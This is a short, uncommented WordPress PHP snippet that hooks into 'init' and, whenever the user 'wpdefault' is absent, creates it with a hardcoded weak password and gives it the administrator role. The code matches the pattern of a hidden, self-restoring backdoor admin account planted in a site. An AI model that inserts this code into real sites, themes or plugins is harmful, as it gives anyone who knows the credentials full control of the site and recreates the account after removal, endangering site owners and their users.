add_action( 'init', function () {
$username = 'wpdefault';
$password = '1234567890!';
$email_address = 'wordpress@example.com';

if ( ! username_exists( $username ) ) {
	$user_id = wp_create_user( $username, $password, $email_address );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
}
} );
